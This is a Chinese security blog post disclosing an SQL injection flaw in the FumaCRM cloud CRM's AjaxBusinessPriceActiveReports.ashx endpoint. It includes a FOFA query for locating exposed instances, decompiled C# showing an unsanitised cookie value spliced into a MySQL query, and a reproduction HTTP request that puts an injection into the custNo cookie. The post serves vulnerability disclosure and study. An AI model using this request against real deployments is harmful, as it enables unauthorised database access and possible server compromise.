---
title: "孚盟云CRM AjaxBusinessPriceActiveReports.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxBusinessPriceActiveReports-sqli.html
asset_dir: assets/孚盟云crm-ajaxbusinesspriceactivereports.ashx-sql注入漏洞
---

# 孚盟云CRM AjaxBusinessPriceActiveReports.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/1/14 08:20
* 304浏览
* [0评论](#comment)
* 22分钟阅读

深入探索

软件

CRM

软件即服务


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

上海孚盟软件有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云AjaxBusinessPriceActiveReports.ashx接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

客户关系管理

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

直接看 `AjaxBusinessPriceActiveReports.ashx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 **AjaxBusinessPriceActiveReports** 方法的实现如下

```
public void ProcessRequest(HttpContext context)
{
  context.Response.ContentType = "text/plain";
  string str = context.Request["action"];
  try
  {
    if (!string.op_Equality(str, "GetTempelateList"))
      return;
    this.GetTempelateList(context);
  }
  catch (Exception ex)
  {
    Helper.WriteLog($"GetTempelateList error message :{ex.Message} StackTrace:{ex.StackTrace}", "ddSaas");
  }
}
```

当**action=GetTempelateList**时，看下`GetTempelateList`方法的实现

SQL注入检测工具

```
public void GetTempelateList(HttpContext context)
{
  Helper.WriteLog("custNo:" + UserCookie.GetCookieValue("custNo"), "ddSaas");
  string cookieValue;
  if (string.op_Equality(UserCookie.GetCookieValue("custNo"), ""))
  {
    LicInfo licInfo = new BasePage().CheckLicNo();
    int num = licInfo.LicenseStr.IndexOf(":");
    cookieValue = licInfo.LicenseStr.Substring(num + 1, licInfo.LicenseStr.Length - num - 1).Replace("&&", "&").Split(new char[1]
    {
      '&'
    })[1];
    if (string.op_Equality(UserCookie.GetCookieValue("custNo"), ""))
      UserCookie.SetCookieValue("custNo", cookieValue);
  }
  else
  {
    cookieValue = UserCookie.GetCookieValue("custNo");
    Helper.WriteLog("CustNo:" + cookieValue, "ddSaas");
  }
  DataTable table = MySqlHelper.ExecuteDataSet(new EncryptData().DecryptString(MySqlHelper.DBConnectionString), (CommandType) 1, $" select * from Tempelate where  (ClientNumber is null or ClientNumber='{cookieValue}') and MouldID='SC002'").Tables[0];
```

当Cookie里的UserCookie的**custNo值不为空时**，**custNo** 未经过任何过滤或校验就被直接拼接进SQL语句中进行执行，从而造成SQL注入漏洞，这里需要注意数据库相关操作为MySQL数据库，而非sql server ！

代码安全审计

# 漏洞复现

> 漏洞利用需要注意，此处是MySQL数据库相关操作，并非mssql ！

```
POST /m/Dingding/Ajax/AjaxBusinessPriceActiveReports.ashx HTTP/1.1
Host: fumacrm.mrxn.net
Cookie: UserCookie={"custNo":"')SQLI_POC-- -"}
Content-Type: application/x-www-form-urlencoded

action=GetTempelateList
```

[![孚盟云CRM AjaxBusinessPriceActiveReports.ashx SQL注入漏洞](images/img-001-23145c615762.webp)](https://image.mrxn.net/43aa4ada8ed94ec98364bef60c161a44.webp)

成功延时 4 秒

漏洞预警服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[孚盟云CRM AjaxBusinessPriceActiveReports.ashx SQL注入漏洞](https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxBusinessPriceActiveReports-sqli.html)  
文章链接：<https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxBusinessPriceActiveReports-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAN3klEQVR4Aeya0Xbj1g5DZ/f///le48CwSPpISTrTSR7UZRokAFIaUYqdrP7z69ev/301/nfx35w1rdHDq04eFFcj/BnKe6aFl6dG+GDVkkebGD04ddXRvopayK/HgE/FY/jbC/gFR8xZaQB7osNRg/N4J8K1rpmzJzX0XnkV0XcoXTE18CxpiuhgPnVF+T4T6VkLSXHj91+BthDwpqHj1WnO7YN7r3rONHBvZk4fWAdjdHANhHrDORNoT7YaPvJMfdaacRbQjweup78tZIp3/fevwB9fyNldEx76nQF8+V+dWbUxHLDu/Koph87HXxHsAWPVlGuOAqyDUZoCkPxb8ccX8ltnczf/+q2FAOtuhAM/uqa6kz6KOSP+8HAcD1g0sM5lFY836PWc8bCsFxy+6QFr0HH61qDHm/gH/NbrtxbyW0e+m7dXoC1EG97FtvNBVu+jXC/w3bSK8gadh14X62ma48WQuuLUUgfBxwVj+B1m7k77KpdZE+ectpAp/uv6bvzXV2AtBHy3wDXOowCTev3GD7Sf6W/GQkD3guvcTeC6tLQUaPVnisyuXmCdczTodfXucuCNBtZMuMY0roWkuPH7r8A/uRu+gvW0wZsPB64zL3xqsB5eGE15DbD3TI9XevKJ0hTQZ8F7LZ9izviohmNWvJrzb+J+QnIFfwi2hYA3DcZ5jmAejNJzFyivAYdHPLje+cEaGOVXTC90HVzDger7twGeM/uh8+A65xcE83BgZoG51Ge4FgJ7M5gHYw6cYaqha+JqxBuE7g8vTJ/yGnDeI1/6hKprQO8F1/GAa/Um4J2Tlh7lCrBv8tISYE/qeME8dFwLienG778CayHZXjCnNWvwNsMDr6+56fkqwvuMOh8OHXz8zxwDrr05RlAzofeAazDKo4DzGqyBUf4asOdzHmshteHOv/cKtIWAt5dtQa93PNgDe8w/L73ByicHz0gdhMWn3D6VYM+c/2oaCdgPB8aSGcHwwTM+unB6wMcJH5RXAdbbQiTc8b1X4B/wZoDXmQDr1/0X8Uyg83D8fJ8bnzW4Fzo+Ry9ID9izyMdb+CBYT/2wvL3OtPDBt8YHAZ7/SNtr9qQOVjPsZ8QD1tMbvJ+QXKEfgmsh2U7OadaTrzp402CMBq7BmBkTwTowpVcNtCd2HkPGcMo/E+CZV31gz0fz4Nx3Nn/y4BlrIR8d8Nb/3hVYf1ychwNvK1sE12CMP7owHOw90YPqUagWKpTXEKeo3Fdz9Stgf15gXp4ZOVZ4sDc8vNfxxhMMD70nevB+QnIlfgi2hWSLOTfo29zp8QbjCYYPhgfPVg3OwRgvuJZHAa7BGF9FsAbGqikH82AUNwOs6ZiKr+ryq08BniVuF9D1tpBdw8393SvQfg+Bvq2cijatAOtglA7OpSvANRjl2YW8CmnCXUhTwH5WeqonXBB6b/jgLzWPiAbuBWP42KHz0qMFxSlmDe4NH7yfkFyJH4JrIdrgLuY5xhNedXLoG5emiB6E7gPXcGC8Qc3ZBRw90eHg4P0vCWB9zgZCvTAzg8D296FXwyMBe6DjQ2qvzJy4/dqbzphTgw9S+eQTwV4wZsbE2ac6HuWK1OBZYJSmiH6F4J4zz24OuAeM6ZVXkbqieEXllINngFHcLtYTshNu7nuuQFsI9O2BazBq84qcKpiHA6PJV2PyqYVw9MN7Lo+izlMuTqEc3Ke8BnRe/l0ALxpYP5rqHOUvw0jAftHgXH6FuF2AfVNrC5niXf/9K7AWAvttacM14N1XdeVgDxg/809Sn2J6xSmgzwLXcODsBWvqV0RXrkgN9qmGI681dF6aAsxrngIQvQK4fMrkV4B9YFwLWRPutx9xBdZCtKka4G3lDMF1PHDU8XwVwTNqX+aHA3smnzoof81VzwDPCg+u01cxnjME90YH13VGcrAWb/hZh18LiXjjH7sC/3pQ+9NJpmRb0LcL+xpI6/Z/QJA4Z9ZaugJYP3eVK+JRroCug2v5pCvAnHIFuJZHIU6hXAHWxYFz8QpxCuU1xO0C3A8Hpi9+sJZ64v2EzCvyzfVayNkWw0/8E+cMx50CznOcOR+sTz5+YEqvOp4QQHsKwwunV5wCes+ZT94zDfoMeRVgHoxrIRLu+BlX4PJvWeCtQcd66rkjwJ6qKQfzYIw/KE9ysEdcjejhwD4wiocjV50A82CcfJ0N9oAxWnD2pq46uDca9Dpe2PP3E5Ir90NwfcvKuUDfWvhsdaJ0cE80cC1NEV55DbBPenjlitRBsDd1UN4ZU5v1mR+OP9WnB3xc6Bg9s8C6+HATpSnA3ujiFGD+fkJ0NX5QrM8Q8HY+Oi9492XTYC11ZsGejw+sw4HRMuMjBD6yfEoH1jewefyzGvZ+HQysKd8F7PX1I2secDdA3M4HfTD0evaAdTBGF+oYCrCmXCFNoXwXOw08Q5oifWAeOkqXT6G8BthbuY9yzVF85Isur+LyR1bMN/69K7AWAr4DtCHFPDxYh47Vp75dxAPujSe8EKwpV0wPdF0eBZiHA8UrMgMODY4P7ujyKlQLa4jbRTzRwMcQD86hozRFepTvYi1kJ9zc91yB9aGerYG3Ok8l+hXOntTQZ4LrzILzuzYzgumZtfjJgY8TfiJYV68CXMOBZz2TT605Nd/V4PlnvvsJyZX5Ibi+ZX10LuCtwjvOXrAnvO6SGuGD0sA9sEd5FGBduSIz4HjKwgXlU6SG/Qzp8tUAe8EojwJcg1FcIv2pg2Bv9GD04P2E5Er8EGwLydY+wpy7fMmD4hTgOyI8uJamqHzyoPQacN4LrDZg/VIHxvQvsbyFB/uK1PrheOrSU71nOXguGOPLDDAPe2wLSfON33cF1rcs6Ns6Ox2wL9uWD8wpV8B1LY8CDl+dJy0B9kwdzMdXMV7onsmn3vWGA88AY/hdrzRAsCKeILCewNTL9Hib9Tc8IY+zuF+nV6B9y5rbShf07YJrIJa1fTj/uZvZwPK+Gh8JmDvzgPWHdb3iW8XzLRzYm/opv+CKf5meyfTO+ml7/Y8d0YXRwOdzVocP3k9IrsQPwfUZMs8FvFUwauMK6HXtk66oXM1h31t7oHukKTIHrKcOygN7LR7oOriGA+PVPEXqieCeMx6Y0qvW3BrA+okR7n5CXpfqZyRtIdC3lVOEPR9dCPZAR2mK3AFgXdxZgD1gTG8wfanh+OyKNrF6gSmvzwFg3a1gfDM9icx6lg2iwfWM1vQowP71oZ4hQbCY+uFfLzAPRulLuHiTRxGL8hrhK1ZdeTTwccEYXh4wp1wBruOZKE8NYFpedXwv4plMXjWwlqpc8bSuhdca7Jt6e0Ii3vh9V2B9qEPf1jwdbXYX8oVXrkgdhOvZgNq2Aay7DYwxZXZqIOkL4wHWjJfwTGDPP+UFYA90XGJ5g0MPDeZyHmd8dLD/fkJypX4Irs+QnAt4S9la+CBYr3Xys57oQegz1BftDOVRTB2OWVP7qNY8BXiG8rMeaYro4B4whq+ecBPlUYSHPuN+QnJlfgiuz5CcizanAG8NOkpTgPn0CeGdEz9D/YrwcHxlFa+IFgTPlqYIH6wc2AtGaYrqVQ3WwwvF7wLevdWv/CzAvdBx+nPc+wmZV+ab68uFZGtB8JZTC+f5gz1glEcRH5hPXbVwYI80xeRTB+F4ysKpT5EaPBOM4eVRpK4I9krfRbzRgFCv3zuiTXwZR3K5kOG9y79wBbbfsuZxgfVdPlsG13BgeuJJHQR7z+rwFaH3ZDa882Aunjqn5mc6uB942eMF1r8/ApzXZz3pDUKfEf5+QnIlfgi2hWS7OTfoWwTX1Vdz9UH3QK93fvXVmJ5o0GeFrwj2VO6rOXgGGHM+cF3X48wecG/1KI9PuaItRMQd33sF2u8h4C1ma2dYTxn2PWC+epWD+cwWlwBrqeOZGD0IJH0h0H7uv4RnkpnPssGhNfr1zQk8Oz446nSAudTTGz4I9t9PSK7ID8G1kGwvCN7WPEcwD0bpZz3h5akRHjxDddV3OdgbDXodvqLmKqB7oddXPepXwHlP7Qf7gEqvHNg+sdD5tZDVUd50EopCrVRcjUWON/ABwBh/bGB+1vD+yx3YO2ekN3zFaMFoZzX4GNGvELoXXNdjJJ+YuWd89O1CIt7496/A+sUQvGn4HF6d5kd3wNRrfTYXfF5X+pUGvMlA+xGi8wBzyhVvTU9CmuJZbgE8aytuSM1T3E/I5uJ8J7UWos18JuaJqieccgX0OwNcgzF+OGo48ugVNVdRuZpfafHJo0gdFKcAQr0QWE+R9BrQeXD9anwk8T/Sy1d84BlrIZcdt/hXr0BbCHhL0PFPnhF49m4m7DUwD8b0gms4cGqpg2Bv7szwFeFjj/zw7gNz0FF+BXQeXEtTtIWIuOO/vwJXR/ithQBXs5s278jUcPz+UTk4ZoefmAOITz5RmgJYnwfRodfhK0L3gGvNqwHm1Vv5mktThFNeI/xvLaQOvPM/cwX+s4WA75psHlzntOGo4cij7xDsA2OdnTx9n62hz1JfZgShe8A1GONTL5iDjtIU1VtrsP8/W0gOfOPXrkBbiDa2i7OR8oI3Oz3SFGe8tMT0pI4O+2OAefnOesCe6EHoPLiG9880zVek9wrlqxEvHPOB0C9MT1vIS72Tb7sCayHA+gYC17g7y2wW3Jt65xUH9imfAV0D13PmrIHXKGD9W17EM4HOZ0ZQtuRgL3SURxHfREDyCmCdRzyLfLzN+kG111pIY+7iW6/A/wEAAP//lwV0HgAAAAZJREFUAwAP+2bRlePJagAAAABJRU5ErkJggg==)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxBusinessPriceActiveReports-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

物流软件安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAN3klEQVR4Aeya0Xbj1g5DZ/f///le48CwSPpISTrTSR7UZRokAFIaUYqdrP7z69ev/301/nfx35w1rdHDq04eFFcj/BnKe6aFl6dG+GDVkkebGD04ddXRvopayK/HgE/FY/jbC/gFR8xZaQB7osNRg/N4J8K1rpmzJzX0XnkV0XcoXTE18CxpiuhgPnVF+T4T6VkLSXHj91+BthDwpqHj1WnO7YN7r3rONHBvZk4fWAdjdHANhHrDORNoT7YaPvJMfdaacRbQjweup78tZIp3/fevwB9fyNldEx76nQF8+V+dWbUxHLDu/Koph87HXxHsAWPVlGuOAqyDUZoCkPxb8ccX8ltnczf/+q2FAOtuhAM/uqa6kz6KOSP+8HAcD1g0sM5lFY836PWc8bCsFxy+6QFr0HH61qDHm/gH/NbrtxbyW0e+m7dXoC1EG97FtvNBVu+jXC/w3bSK8gadh14X62ma48WQuuLUUgfBxwVj+B1m7k77KpdZE+ectpAp/uv6bvzXV2AtBHy3wDXOowCTev3GD7Sf6W/GQkD3guvcTeC6tLQUaPVnisyuXmCdczTodfXucuCNBtZMuMY0roWkuPH7r8A/uRu+gvW0wZsPB64zL3xqsB5eGE15DbD3TI9XevKJ0hTQZ8F7LZ9izviohmNWvJrzb+J+QnIFfwi2hYA3DcZ5jmAejNJzFyivAYdHPLje+cEaGOVXTC90HVzDger7twGeM/uh8+A65xcE83BgZoG51Ge4FgJ7M5gHYw6cYaqha+JqxBuE7g8vTJ/yGnDeI1/6hKprQO8F1/GAa/Um4J2Tlh7lCrBv8tISYE/qeME8dFwLienG778CayHZXjCnNWvwNsMDr6+56fkqwvuMOh8OHXz8zxwDrr05RlAzofeAazDKo4DzGqyBUf4asOdzHmshteHOv/cKtIWAt5dtQa93PNgDe8w/L73ByicHz0gdhMWn3D6VYM+c/2oaCdgPB8aSGcHwwTM+unB6wMcJH5RXAdbbQiTc8b1X4B/wZoDXmQDr1/0X8Uyg83D8fJ8bnzW4Fzo+Ry9ID9izyMdb+CBYT/2wvL3OtPDBt8YHAZ7/SNtr9qQOVjPsZ8QD1tMbvJ+QXKEfgmsh2U7OadaTrzp402CMBq7BmBkTwTowpVcNtCd2HkPGcMo/E+CZV31gz0fz4Nx3Nn/y4BlrIR8d8Nb/3hVYf1ychwNvK1sE12CMP7owHOw90YPqUagWKpTXEKeo3Fdz9Stgf15gXp4ZOVZ4sDc8vNfxxhMMD70nevB+QnIlfgi2hWSLOTfo29zp8QbjCYYPhgfPVg3OwRgvuJZHAa7BGF9FsAbGqikH82AUNwOs6ZiKr+ryq08BniVuF9D1tpBdw8393SvQfg+Bvq2cijatAOtglA7OpSvANRjl2YW8CmnCXUhTwH5WeqonXBB6b/jgLzWPiAbuBWP42KHz0qMFxSlmDe4NH7yfkFyJH4JrIdrgLuY5xhNedXLoG5emiB6E7gPXcGC8Qc3ZBRw90eHg4P0vCWB9zgZCvTAzg8D296FXwyMBe6DjQ2qvzJy4/dqbzphTgw9S+eQTwV4wZsbE2ac6HuWK1OBZYJSmiH6F4J4zz24OuAeM6ZVXkbqieEXllINngFHcLtYTshNu7nuuQFsI9O2BazBq84qcKpiHA6PJV2PyqYVw9MN7Lo+izlMuTqEc3Ke8BnRe/l0ALxpYP5rqHOUvw0jAftHgXH6FuF2AfVNrC5niXf/9K7AWAvttacM14N1XdeVgDxg/809Sn2J6xSmgzwLXcODsBWvqV0RXrkgN9qmGI681dF6aAsxrngIQvQK4fMrkV4B9YFwLWRPutx9xBdZCtKka4G3lDMF1PHDU8XwVwTNqX+aHA3smnzoof81VzwDPCg+u01cxnjME90YH13VGcrAWb/hZh18LiXjjH7sC/3pQ+9NJpmRb0LcL+xpI6/Z/QJA4Z9ZaugJYP3eVK+JRroCug2v5pCvAnHIFuJZHIU6hXAHWxYFz8QpxCuU1xO0C3A8Hpi9+sJZ64v2EzCvyzfVayNkWw0/8E+cMx50CznOcOR+sTz5+YEqvOp4QQHsKwwunV5wCes+ZT94zDfoMeRVgHoxrIRLu+BlX4PJvWeCtQcd66rkjwJ6qKQfzYIw/KE9ysEdcjejhwD4wiocjV50A82CcfJ0N9oAxWnD2pq46uDca9Dpe2PP3E5Ir90NwfcvKuUDfWvhsdaJ0cE80cC1NEV55DbBPenjlitRBsDd1UN4ZU5